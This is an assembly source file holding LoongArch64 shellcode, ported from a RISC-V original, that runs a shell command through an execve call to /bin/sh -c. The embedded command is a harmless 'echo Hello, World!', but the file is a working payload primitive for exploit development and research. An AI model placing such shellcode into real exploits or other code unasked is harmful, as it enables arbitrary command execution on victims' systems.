# LoongArch64 command execution shellcode
# ported to LoongArch from modexp's RISC-V shellcode:
# - https://github.com/odzhan/shellcode/blob/master/os/linux/riscv64/cmd.s
# ---
# bcoles

.global _start
.section .text

_start:
    # execve("/bin/sh", {"/bin/sh", "-c", cmd, NULL}, NULL);
    addi.d   $sp, $sp, -64            # allocate 64 bytes of stack
    li.d     $a7, 221                 # execve
    li.d     $a0, 0x0068732F6E69622F  # a0 = "/bin/sh\0"
    st.d     $a0, $sp, 0              # store "/bin/sh\0" on the stack
    move     $a0, $sp                 # a0 = sp
    li.d     $a1, 0x632D              # a1 = "-c"
    st.d     $a1, $sp, 8              # store "-c" on the stack
    addi.d   $a1, $sp, 8              # a1 = sp + 8
    la       $a2, cmd                 # a2 = cmd
    st.d     $a0, $sp, 16             # store a0 on the stack
    st.d     $a1, $sp, 24             # store a1 on the stack
    st.d     $a2, $sp, 32             # store a2 on the stack
    st.d     $zero, $sp, 40           # store NULL on the stack
    addi.d   $a1, $sp, 16             # a1 = {"/bin/sh", "-c", cmd, NULL}
    move     $a2, $zero               # penv = NULL
    syscall  0x0101
cmd:
    .asciz "echo Hello, World!"
